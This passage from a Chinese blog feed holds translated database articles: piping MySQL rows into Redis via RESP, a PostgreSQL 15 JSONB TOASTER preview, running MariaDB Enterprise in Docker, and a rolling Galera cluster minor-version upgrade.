<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> CONCAT(</span><br><span class="line">&quot;*10\r\n&quot;,</span><br><span class="line"><span class="string">&#x27;$&#x27;</span>, LENGTH(redis_cmd), <span class="string">&#x27;\r\n&#x27;</span>,redis_cmd, <span class="string">&#x27;\r\n&#x27;</span>,<span class="string">&#x27;$&#x27;</span>, LENGTH(redis_key), <span class="string">&#x27;\r\n&#x27;</span>,redis_key, <span class="string">&#x27;\r\n&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;$&#x27;</span>, LENGTH(hkey1), <span class="string">&#x27;\r\n&#x27;</span>,hkey1, <span class="string">&#x27;\r\n&#x27;</span>,<span class="string">&#x27;$&#x27;</span>, LENGTH(hval1), <span class="string">&#x27;\r\n&#x27;</span>, hval1, <span class="string">&#x27;\r\n&#x27;</span></span><br><span class="line"><span class="string">&#x27;$&#x27;</span>, LENGTH(hkey2), <span class="string">&#x27;\r\n&#x27;</span>,hkey2, <span class="string">&#x27;\r\n&#x27;</span>,<span class="string">&#x27;$&#x27;</span>, LENGTH(hval2), <span class="string">&#x27;\r\n&#x27;</span>, hval2, <span class="string">&#x27;\r\n&#x27;</span></span><br><span class="line"><span class="string">&#x27;$&#x27;</span>, LENGTH(hkey3), <span class="string">&#x27;\r\n&#x27;</span>,hkey3, <span class="string">&#x27;\r\n&#x27;</span>,<span class="string">&#x27;$&#x27;</span>, LENGTH(hval3), <span class="string">&#x27;\r\n&#x27;</span>, hval3, <span class="string">&#x27;\r\n&#x27;</span></span><br><span class="line"><span class="string">&#x27;$&#x27;</span>, LENGTH(hkey4), <span class="string">&#x27;\r\n&#x27;</span>,hkey4, <span class="string">&#x27;\r\n&#x27;</span>,<span class="string">&#x27;$&#x27;</span>, LENGTH(hval4), <span class="string">&#x27;\r\n&#x27;</span>, hval4, <span class="string">&#x27;\r\n&#x27;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">FROM</span> (</span><br><span class="line"> <span class="keyword">SELECT</span></span><br><span class="line"><span class="string">&#x27;HSET&#x27;</span> <span class="keyword">AS</span> redis_cmd, CONCAT(<span class="string">&#x27;city:&#x27;</span>,ID) <span class="keyword">AS</span> redis_key,</span><br><span class="line"><span class="string">&#x27;Name&#x27;</span> <span class="keyword">AS</span> hkey1, Name <span class="keyword">AS</span> hval1,</span><br><span class="line"><span class="string">&#x27;CountryCode&#x27;</span> <span class="keyword">AS</span> hkey2, CountryCode <span class="keyword">AS</span> hval2,</span><br><span class="line"><span class="string">&#x27;District&#x27;</span> <span class="keyword">AS</span> hkey3, District <span class="keyword">AS</span> hval3,</span><br><span class="line"><span class="string">&#x27;Population&#x27;</span> <span class="keyword">AS</span> hkey4, Population <span class="keyword">AS</span> hval4</span><br><span class="line"> <span class="keyword">FROM</span> world.city</span><br><span class="line"> ) <span class="keyword">AS</span> t;</span><br></pre></td></tr></table></figure></div>
<p>保存SQL到<code>resp.sql</code>文件，并用Redis的管道模式从MySQL流到Redis：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">bash-3.2$ mysql -h 127.0.0.1 -uroot -p -Dworld --skip-column-names --raw &lt;/tmp/resp.sql |redis-cli -p 4321 --pipe</span><br><span class="line">Enter password:</span><br><span class="line">All data transferred. Waiting for the last reply...</span><br><span class="line">Last reply received from server.</span><br><span class="line">errors: 0, replies: 4079</span><br></pre></td></tr></table></figure></div>
<p>数据已经导入到Redis服务器！</p>
<h2 id="使用-Redis-的-MySQL-连接器：redis-connect-mysql">使用 Redis 的 MySQL 连接器：redis-connect-mysql</h2>
<p>最后一节，我将介绍如何使用Redis连接套件，特别是 <a class="link"   href="https://github.com/redis-field-engineering/redis-connect-dist/tree/main/connectors/mysql#redis-connect-mysql" >redis-connect-mysql <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。您可以阅读这份文档：</p>
<blockquote>
<p>redis-connect-mysql第一次连接MySQL时，它会读取所有模式的一致性快照。当快照创建完成，连接器将连续发送MySQL的变更并生成相应的insert,update或delete事件。</p>
</blockquote>
<p>因此，它不仅仅是一个迁移工具，还是一个连接异构数据库的复制和传输工具。Redis CDC （变更数据捕捉）曾在RedisConf 2021上演示，所以请查看演示的详细内容。</p>
<blockquote>
<p>译者注：这段视频在油管上，此处跳过。<br>
<a class="link"   href="https://www.youtube.com/embed/VrkZjh0REgU?feature=oembed" >RedisCDC: Seamless database migrations and continuous changed-data replication, Redis Labs <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>我现在没有运行使用RedisCDC的示例，但是请查看<a class="link"   href="https://github.com/redis-field-engineering/redis-connect-dist/tree/main/connectors/mysql#setting-up-mysql-source" >代码库 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 来了解如何操作它。</p>
<h2 id="清理">清理</h2>
<p>为了移除那些导入的Hash值，您可以执行下面的命令：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">redis-cli -p &lt;PORT&gt; --scan --pattern city:* -i 0.01 | xargs redis-cli -p &lt;PORT&gt; unlink</span><br></pre></td></tr></table></figure></div>
<h2 id="总结">总结</h2>
<p>现在，您能从MySQL导出一张表，或者从其他的关系型数据库，任何可以导出CSV的数据库，或者RIOT DB，或者RedisCDC能连接的多种数据库。</p>
<blockquote>
<p>支持RedisCDC的连接器在 <a class="link"   href="https://github.com/redis-field-engineering/redis-connect-dist/tree/main/connectors" >这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，支持 RIOT DB的连接器在<a class="link"   href="https://developer.redis.com/riot/index.html#_drivers" >这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
</blockquote>
<p>接下来，您可能想知道您能用这些创建在Redis实例中的哈希值做些什么。所以我在下篇文章中，将分享一些例子，关于在Redis中存储、检索、更改、删除、索引和检索数据的命令。</p>
<p>那么现在呢? 你可能想知道你可以用这些在Redis实例中创建的哈希值做什么。所以在下一篇文章中，我将分享几个在Redis中存储、检索、更改、删除、索引和搜索数据的命令示例。别走开，我很快就会写的！</p>
]]></content>
      <categories>
        <category>MySQL</category>
        <category>Translate</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>译文</tag>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>[译] 一个TOAST适配所有：JSONB TOASTER | PG 15 特性预览</title>
    <url>/2022/postgresql/fanyi-pg-15-jsonb-toaster/</url>
    <content><![CDATA[<blockquote>
<p>原文地址：<a class="link"   href="https://obartunov.livejournal.com/205362.html" >https://obartunov.livejournal.com/205362.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
原文作者：obartunov</p>
</blockquote>
<p>我们已经为 PG 15 <a class="link"   href="https://commitfest.postgresql.org/37/3490/" >提交了 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> TOAST API。</p>
<p>下面是JSONB的性能分析，它使用了TOAST API实现的JSONB TOASTER。</p>
<p>每个jsonb，诸如：key1, looong key2[], key3, loong key4[]。 关于基准测试中使用的数据和查询的描述，请查看我们在 <a class="link"   href="http://www.sai.msu.su/~megera/postgres/talks/jsonb-pgvision-2021.pdf" >pgvision 2021 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 演讲中的第10张幻灯片。</p>
<p>下图中可以清晰的看出 jsonb 缩放的问题。</p>
<img  alt="1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220315-c9b58604-1a2e-4f62-a741-42ac9c33ca49.png"
                      referrerpolicy="no-referrer"
                >
<p>我们使用TOAST API实现了自定义的JSONB TOASTER(作为一个扩展!)，并依据JSONB大小(inline, compressed inline, toasted)和关键位置的不同展示了优化结果集。 我们可以看到(第一张图)，所有的优化(+all)都会导致两个数量级的性能提升。</p>
<img  alt="2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220315-85c5d0a0-30da-4164-9904-ac9e6c2f8154.png"
                      referrerpolicy="no-referrer"
                >
<p>其他图片显示了关键访问性能受不同指标和jsonb大小的影响情况。</p>
<img  alt="3.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220315-7fc25787-c56b-4e67-bad9-de9b9480e363.png"
                      referrerpolicy="no-referrer"
                >
<img  alt="4.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220315-550120ea-ed31-4f11-be9c-2612be4dc330.png"
                      referrerpolicy="no-referrer"
                >
<img  alt="5.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220315-ce3700cc-2900-45d6-b89a-860efe57d353.png"
                      referrerpolicy="no-referrer"
                >
<p>备注：</p>
<p>TOAST API是基于postgres可扩展性的扩展插件，它允许按自数据类型定制长值存储(以扩展插件形式实现)。我们的计划是将API包含在PG15，以及GSON，一个通用 <a class="link"   href="http://www.sai.msu.su/~megera/postgres/talks/json-build-2020.pdf" >JSON API <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，这样我们之后可以发布<code>jsonb_toaster</code>扩展插件。因为我们决定只专注于JSONB，所以我们将移除GSON对JSON的支持（以后可以恢复），以使得补丁更小。</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/375626" >https://www.modb.pro/db/375626 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>PostgreSQL</category>
        <category>PostgreSQL 15</category>
      </categories>
      <tags>
        <tag>译文</tag>
        <tag>postgresql</tag>
        <tag>postgresql 15</tag>
        <tag>jsonb</tag>
        <tag>toaster</tag>
      </tags>
  </entry>
  <entry>
    <title>[译] MariaDB 企业版数据库的 Docker 镜像</title>
    <url>/2022/mariadb/fanyi-introducing-docker-images-for-mariadb-enterprise-server/</url>
    <content><![CDATA[<blockquote>
<p>原文地址：<a class="link"   href="https://mariadb.com/resources/blog/introducing-docker-images-for-mariadb-enterprise-server/" >https://mariadb.com/resources/blog/introducing-docker-images-for-mariadb-enterprise-server/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
原文作者：Rob Hedgpeth</p>
</blockquote>
<p>MariaDB公司最近发布了 <a class="link"   href="https://mariadb.com/docs/reference/mdb/docker/" >MariaDB企业Docker注册中心 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，它将提供 <a class="link"   href="https://mariadb.com/docs/features/mariadb-enterprise-server/" >MariaDB企业版数据库 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的 <a class="link"   href="https://docs.docker.com/engine/reference/commandline/images/" >Docker镜像 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
<p>这使得用户能够使用Docker下载、安装和使用MariaDB Enterprise Server。Docker是一个开放的平台，用于开发、发布和运行应用程序，而无需管理基础设施。</p>
<p>Docker通过提供了一个允许你创建一个新容器的镜像。</p>
<img  alt="1.webp" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220311-815d3106-c3c9-4dc5-afee-e582ba35245f.webp"
                      referrerpolicy="no-referrer"
                >
<p>更具体地说，MariaDB公司的付费用户，现在可以使用官方版的MariaDB企业数据库镜像来创建Docker容器。容器提供了一种可移植的、隔离的方式来管理软件，而不必担心主机操作系统。</p>
<h2 id="容器的易用性">容器的易用性</h2>
<p>您可能已经知道 <a class="link"   href="https://hub.docker.com/_/mariadb" >MariaDB社区版数据库的Docker镜像 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 已经发布一段时间了。</p>
<img  alt="2.webp" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220311-36256808-3a89-47be-bc93-4f7dfcc86c3e.webp"
                      referrerpolicy="no-referrer"
                >
<p>现在MariaDB企业版数据库也支持Docker部署，以支持需要在现有基础设施上快速部署的场景，例如：</p>
<ul>
<li>作为持续集成（CI）的一部分，不断创建和销毁的自动化测试环境。</li>
<li>在本地工作站上创建一个小型测试环境。</li>
<li>在同一主机创建多个隔离的测试环境。</li>
</ul>
<h2 id="创建一个MariaDB企业版Docker容器">创建一个MariaDB企业版Docker容器</h2>
<p>从这里开始，我们从MariaDB企业Docker注册中心拉取一个MariaDB企业版数据库的镜像，以此可以快速、简单的启动一个容器。</p>
<p>提示：关于如何使用MariaDB企业Docker注册中心来创建和部署一个Docker容器，等更多更详细的参考资料，请务必参考<a class="link"   href="https://mariadb.com/docs/deploy/deployment-methods/docker/" >官方文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
<p><strong>第一步</strong>：获取您的MariaDB客户下载令牌</p>
<p>要使用MariaDB企业Docker注册中心，您需要在出现提示的地方提供客户下载令牌作为密码。</p>
<p>因此，为了获取令牌，你需要做以下事情：</p>
<ol>
<li>导航到MariaDB客户门户网站的<a class="link"   href="https://customers.mariadb.com/downloads/token/?_ga=2.253766414.742858165.1646876317-330382977.1608699423" >客户下载令牌 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 页面。</li>
<li>登陆您的<a class="link"   href="https://id.mariadb.com/?_ga=2.253766414.742858165.1646876317-330382977.1608699423" >MariaDB账号 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</li>
<li>复制客户下载令牌，稍后将作为登录MariaDB企业Docker注册中心的密码。</li>
</ol>
<img  alt="3.webp" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220311-cb8aab73-84c3-486e-8f61-49f45f247553.webp"
                      referrerpolicy="no-referrer"
                >
<p><strong>第二步</strong>: 登录Docker注中心<br>
执行下面的<code>docker</code>命令登录MariaDB企业Docker注册中心：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker login docker.mariadb.com</span></span><br></pre></td></tr></table></figure></div>
<p>然后，当出现提示时，输入登录凭证:</p>
<ul>
<li>用户名: 与MariaDB账户关联的电子邮箱地址。</li>
<li>密码: 步骤1中获取的客户下载令牌。</li>
</ul>
<img  alt="4.webp" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220311-071cba7a-aafb-4816-996b-5cba7489ee7c.webp"
                      referrerpolicy="no-referrer"
                >
<p><strong>第三步</strong>: 拉取Docker镜像<br>
在MariaDB企业Docker注册中心的企业服务器仓库里，包含了使用特定 <a href="https://mariadb.com/docs/reference/mdb/docker/#mdb-docker-tags">标签（<code>tags</code>）</a> 来映射不同MariaDB企业发行版的镜像。</p>
<p>注意：在本次演练中，我将使用<code>latest</code>标签，它指向最新版本的MariaDB数据库镜像。有关可用标签的更多信息，请参阅<a class="link"   href="https://mariadb.com/docs/reference/mdb/docker/#mdb-docker-tags" >官方文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
<p>使用下面的命令拉取最新的Docker镜像：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker pull docker.mariadb.com/enterprise-server:latest</span></span><br></pre></td></tr></table></figure></div>
<img  alt="5.gif" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220311-8e098749-9355-42fa-aa90-fa689bd3a4bc.gif"
                      referrerpolicy="no-referrer"
                >
<p><strong>第四步</strong>：创建一个新的容器</p>
<p>当你已经拉取MariaDB企业版Docker镜像，你就可以创建一个新的容器：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker run --detach --name mariadb-es-latest --<span class="built_in">env</span></span></span><br><span class="line">MARIADB_ROOT_PASSWORD=&#x27;Password123!&#x27;</span><br><span class="line">docker.mariadb.com/enterprise-server:latest</span><br></pre></td></tr></table></figure></div>
<p>然后会返回一个新的容器序号：</p>
<img  alt="6.webp" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220312-ec681073-fe2f-420e-b9be-fbbc299d5348.webp"
                      referrerpolicy="no-referrer"
                >
<p><strong>第五步</strong>：连接容器并使用MariaDB企业版</p>
<p>最后，您可以确认容器已经创建，MariaDB企业版已启动成功，通过连接容器并使用容器中所包含的MariaDB命令行客户端。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ docker exec -it mariadb-es-latest mariadb -u root -pPassword123!</span><br></pre></td></tr></table></figure></div>
<img  alt="7.gif" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220312-65ea7eb1-90f9-4a9d-a22c-0e00802745ba.gif"
                      referrerpolicy="no-referrer"
                >
<h2 id="了解更多">了解更多</h2>
<p>如果您想更多的了解关于如何开始使用MariaDB企业Docker注册中心，来管理容器化的MariaDB企业版数据库，您可以从<a class="link"   href="https://mariadb.com/docs/reference/mdb/docker/" >官方文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
获取更多信息。</p>
<p>同时，如果您想了解更多关于MariaDB特性和功能，可以参阅下面的资源：</p>
<ul>
<li><a class="link"   href="https://mariadb.com/docs" >MariaDB官方文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://mariadb.com/developers" >MariaDB开发者中心 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://github.com/mariadb-developers" >MariaDB开发者代码中心 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> – 一个GitHub空间提供了开发示例</li>
<li><a class="link"   href="https://r.mariadb.com/join-community-slack?_ga=2.92665181.159460944.1647085831-150853383.1641209969" >MariaDB社区Slack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<p>祝您使用愉快！</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/374699" >https://www.modb.pro/db/374699 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>MariaDB</category>
        <category>Translate</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>mariadb</tag>
        <tag>译文</tag>
      </tags>
  </entry>
  <entry>
    <title>[译] 记一次 MySQL Galera 集群的小版本升级</title>
    <url>/2022/mysql/fanyi-minor-version-upgrade-of-a-galera-cluster-for-mysql/</url>
    <content><![CDATA[<blockquote>
<p>原文地址：<a class="link"   href="https://galeracluster.com/2022/01/minor-version-upgrade-of-a-galera-cluster-for-mysql/" >https://galeracluster.com/2022/01/minor-version-upgrade-of-a-galera-cluster-for-mysql/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
原文作者：<a class="link"   href="http://galeracluster.com" >galeracluster.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>最近，我们遇到了一个关于如何执行Galera集群小版本升级的问题，今天我们只想说它是相当简单的。虽然升级是<a class="link"   href="https://galeracluster.com/galera-mgr/" >Galera管理器 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的一个特性，我们很高兴看到即将它到来，今天，在命令行上手动完成它是非常简单的! 在这篇文章中，我们将升级一个9节点的集群，从MySQL 8.0.23升级到8.0.26。 我们也有大量的文档: <a class="link"   href="https://galeracluster.com/library/documentation/upgrading.html" >升级Galera集群 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>我们在新加坡、伦敦和旧金山分别有三个节点，共9个节点组成的集群，我们可以通过执行<code>show status like 'wsrep_cluster_size';</code>来确认它。</p>
<p>由于我们在CentOS 7上通过向配置中添加YUM仓库，并使用RPM包管理器来安装的，所以我们只需执行<code>yum -y update</code>。当然，我们计划先升级旧金山的三个节点，逐个节点升级（如滚动升级），这样就不会同时有多个节点停机。然后我们在伦敦重复这一过程，最后是新加坡。只要按计划升级，顺序并不重要。这次升级的过程中，并没有停止事务，就是说，数据库持续提供服务。</p>
<p><code>yum update</code>所做的就是为我们安装MySQL和<code>Galera wsrep provider</code>，由于我们不打算更改配置文件，我们只需让程序自动运行。RPM包中有一些钩子，可以确保自动运行<code>mysql_upgrade</code>。</p>
<p>当然，在升级过程中，我们能看到集群大小会暂时从9个节点减少到8个节点，但这是意料之中的。升级过程中，需要确保<code>gcache</code>配置的足够大，但仍可能出现 <a class="link"   href="https://galeracluster.com/library/documentation/state-transfer.html#state-transfer-ist" >IST <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
<p>可以用下面这些查询语句来验证所有节点均已更新：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> version();</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+</span></span><br><span class="line"><span class="operator">|</span> version() <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">8.0</span><span class="number">.23</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> status <span class="keyword">like</span> <span class="string">&#x27;wsrep_cluster_size&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name      <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> wsrep_cluster_size <span class="operator">|</span> <span class="number">9</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+-------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">  Updating   : mysql<span class="operator">-</span>wsrep<span class="operator">-</span>server<span class="number">-8.0</span><span class="number">.26</span><span class="operator">-</span> [######################     ]  <span class="number">67</span><span class="operator">/</span><span class="number">258</span></span><br><span class="line">  Cleanup    : mysql<span class="operator">-</span>wsrep<span class="operator">-</span>common<span class="number">-8.0</span><span class="number">.23</span><span class="number">-26.6</span>.el7.x86_64                <span class="number">240</span><span class="operator">/</span><span class="number">258</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> status <span class="keyword">like</span> <span class="string">&#x27;wsrep_cluster_size&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name      <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> wsrep_cluster_size <span class="operator">|</span> <span class="number">8</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+-------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.wsrep_cluster_members;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------+--------------------------------------+--------------+-----------------------+</span></span><br><span class="line"><span class="operator">|</span> node_uuid                            <span class="operator">|</span> cluster_uuid                         <span class="operator">|</span> node_name    <span class="operator">|</span> node_incoming_address <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------+--------------------------------------+--------------+-----------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">10</span>ff4e95<span class="operator">-</span>dfd8<span class="number">-11</span>eb<span class="number">-9</span>cd8<span class="number">-7</span>ed190657de9 <span class="operator">|</span> d04a1319<span class="operator">-</span>d89d<span class="number">-11</span>eb<span class="number">-86</span>c2<span class="number">-3</span>fe756007e90 <span class="operator">|</span> galerasf<span class="number">-03</span>  <span class="operator">|</span> AUTO                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">113</span>a4bb9<span class="number">-8010</span><span class="number">-11</span>ec<span class="operator">-</span>bbe1<span class="operator">-</span>c38d9738c824 <span class="operator">|</span> d04a1319<span class="operator">-</span>d89d<span class="number">-11</span>eb<span class="number">-86</span>c2<span class="number">-3</span>fe756007e90 <span class="operator">|</span> galerasf<span class="number">-02</span>  <span class="operator">|</span> AUTO                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">4</span>d13b29e<span class="operator">-</span>dfcd<span class="number">-11</span>eb<span class="number">-8108</span><span class="number">-133e852022</span>df <span class="operator">|</span> d04a1319<span class="operator">-</span>d89d<span class="number">-11</span>eb<span class="number">-86</span>c2<span class="number">-3</span>fe756007e90 <span class="operator">|</span> galera<span class="number">-03</span>    <span class="operator">|</span> AUTO                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">4</span>ec352d5<span class="operator">-</span>e00a<span class="number">-11</span>eb<span class="number">-93</span>c3<span class="number">-4746e95</span>e5d89 <span class="operator">|</span> d04a1319<span class="operator">-</span>d89d<span class="number">-11</span>eb<span class="number">-86</span>c2<span class="number">-3</span>fe756007e90 <span class="operator">|</span> galerasf     <span class="operator">|</span> AUTO                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">6644</span>b74f<span class="operator">-</span>dfcd<span class="number">-11</span>eb<span class="number">-82</span>cf<span class="operator">-</span>ca20c5363b91 <span class="operator">|</span> d04a1319<span class="operator">-</span>d89d<span class="number">-11</span>eb<span class="number">-86</span>c2<span class="number">-3</span>fe756007e90 <span class="operator">|</span> galera<span class="number">-02</span>    <span class="operator">|</span> AUTO                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">7</span>a7edaa1<span class="operator">-</span>dfcd<span class="number">-11</span>eb<span class="operator">-</span>b5e1<span class="number">-23</span>b77330d3d5 <span class="operator">|</span> d04a1319<span class="operator">-</span>d89d<span class="number">-11</span>eb<span class="number">-86</span>c2<span class="number">-3</span>fe756007e90 <span class="operator">|</span> galera       <span class="operator">|</span> AUTO                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> a5cc9925<span class="operator">-</span>dfd7<span class="number">-11</span>eb<span class="number">-9831</span><span class="operator">-</span>b76bc19aa3a4 <span class="operator">|</span> d04a1319<span class="operator">-</span>d89d<span class="number">-11</span>eb<span class="number">-86</span>c2<span class="number">-3</span>fe756007e90 <span class="operator">|</span> galeralon<span class="number">-02</span> <span class="operator">|</span> AUTO                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> c0078cbd<span class="operator">-</span>dfd7<span class="number">-11</span>eb<span class="number">-8877</span><span class="number">-7e671</span>c4d3a89 <span class="operator">|</span> d04a1319<span class="operator">-</span>d89d<span class="number">-11</span>eb<span class="number">-86</span>c2<span class="number">-3</span>fe756007e90 <span class="operator">|</span> galeralon<span class="number">-03</span> <span class="operator">|</span> AUTO                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> e7fe42fd<span class="operator">-</span>dfce<span class="number">-11</span>eb<span class="number">-9675</span><span class="number">-36</span>d358e01b8d <span class="operator">|</span> d04a1319<span class="operator">-</span>d89d<span class="number">-11</span>eb<span class="number">-86</span>c2<span class="number">-3</span>fe756007e90 <span class="operator">|</span> galeralon    <span class="operator">|</span> AUTO                  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------+--------------------------------------+--------------+-----------------------+</span></span><br><span class="line"><span class="number">9</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></div>
<p>现在您会发现，只要您使用包管理，一次小版本升级真的很简单。而且升级过程中不需要停机。</p>
]]></content>
      <categories>
        <category>MySQL</category>
        <category>Translate</category>
      </categories>
      <tags>
        <tag>upgrade</tag>
        <tag>mysql</tag>
        <tag>galera</tag>
        <tag>译文</tag>
        <tag>mysql 8.0</tag>
      </tags>
  </entry>
  <entry>
    <title>[译] 是时候该检查 Galera 集群的安全了？</title>
    <url>/2022/mysql/fanyi-time-to-check-galera-cluster-security/</url>
    <content><![CDATA[<blockquote>
<p>原文地址：<a class="link"   href="https://galeracluster.com/2022/01/time-to-check-galera-cluster-security/" >https://galeracluster.com/2022/01/time-to-check-galera-cluster-security/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
原文作者：<a class="link"   href="http://galeracluster.com" >galeracluster.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
